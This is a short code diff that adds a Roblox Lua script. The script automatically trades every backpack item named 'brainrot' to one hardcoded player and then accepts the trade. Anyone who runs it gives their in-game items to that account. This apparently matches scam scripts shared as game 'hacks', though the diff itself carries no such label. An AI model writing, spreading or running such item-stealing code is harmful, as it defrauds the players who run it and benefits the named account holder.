@@ -1,0 +1,26 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local LocalPlayer = Players.LocalPlayer
+local TargetPlayer = "YliesssSAB"
+
+local TradeRequest = ReplicatedStorage:WaitForChild("TradeRequest")
+local AddTradeItem = ReplicatedStorage:WaitForChild("AddTradeItem")
+local AcceptTrade = ReplicatedStorage:WaitForChild("AcceptTrade")
+
+TradeRequest:FireServer(TargetPlayer)
+
+task.wait(2)
+
+for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do
+    if string.find(v.Name:lower(), "brainrot") then
+        AddTradeItem:FireServer(v)
+        task.wait(0.2)
+    end
+end
+
+task.wait(1)
+
+AcceptTrade:FireServer()
+
+print("Trade envoyé automatiquement.")
